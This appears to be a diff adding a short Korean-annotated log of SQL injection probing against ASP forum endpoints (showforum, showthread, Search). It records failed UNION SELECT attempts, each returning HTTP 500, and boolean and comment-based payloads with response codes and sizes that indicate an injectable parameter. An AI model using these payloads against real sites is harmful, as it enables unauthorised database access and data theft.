@@ -1,0 +1,23 @@
+
+### showforum.asp?id=
+  ❌ UNION SELECT ...--: 1~15 전부 500
+  ❌ UNION ALL SELECT ...--: 1~15 전부 500
+  ❌ UNION SELECT .../*: 1~15 전부 500
+
+### showthread.asp?id=
+  ❌ -1 UNION SELECT {cols}--: 1~15 전부 500
+  ❌ 0 UNION SELECT ...--: 1~15 전부 500
+
+### Search.asp?tfSearch=
+  ❌ zzz' UNION SELECT {cols}--: 1~15 전부 500
+  ❌ ' UNION SELECT {cols}--: 1~15 전부 500
+
+### 참고: 주석/연산자 동작 재확인 (showforum)
+  1 AND 1=1                  -> 200 3117
+  1 AND 1=2                  -> 500 1208
+  1; --                      -> 200 3109
+  1) --                      -> 500 1208
+  1 --                       -> 200 3099
+  1/**/AND/**/1=1            -> 200 3161
+  1 AND (SELECT 1)=1         -> 200 3159
+  1 AND 1=1 --               -> 200 3139
